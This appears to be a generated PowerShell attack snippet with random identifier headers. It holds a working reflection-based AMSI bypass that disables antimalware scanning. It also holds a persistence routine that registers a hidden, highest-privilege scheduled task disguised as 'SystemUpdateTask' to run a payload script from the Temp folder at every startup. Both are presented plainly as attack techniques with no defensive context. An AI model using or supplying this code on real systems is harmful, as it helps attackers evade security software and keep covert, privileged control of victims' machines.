# Z9QhVZojZGP6bsbzk5lr
# Generated: 2025-11-03T12:20:52.709167
# System: tXAGIMmViNIHzAq
# Process: Hq0MH6Uusnvr


# AMSI Bypass via Reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)



# Persistence via scheduled task
$taskName = "SystemUpdateTask"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Windows\Temp\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
